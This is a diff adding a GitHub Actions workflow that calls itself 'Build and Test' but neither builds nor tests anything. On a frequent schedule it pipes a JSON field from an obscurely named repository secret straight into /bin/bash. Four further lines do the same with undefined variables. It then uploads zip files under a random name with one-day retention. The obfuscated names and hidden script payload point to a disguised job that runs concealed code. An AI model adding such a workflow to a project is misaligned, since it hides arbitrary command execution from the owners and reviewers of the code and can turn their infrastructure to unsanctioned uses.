@@ -1,0 +1,37 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '5 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Go
+        env:
+          vg23327: ${{ secrets.vg23327 }}
+        run: |
+          printf '%s' "$vg23327" | jq -r .xq7691 | /bin/bash
+          printf '%s' "$j6486" | jq -r .qzkvr90442 | /bin/bash
+          printf '%s' "$aufg3107" | jq -r .myp98 | /bin/bash
+          printf '%s' "$dr8668" | jq -r .oecrw3187 | /bin/bash
+          echo $p337 | jq -r .xxotz5656 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a8yVuBkh
+          path: "*.zip"
+          retention-days: 1
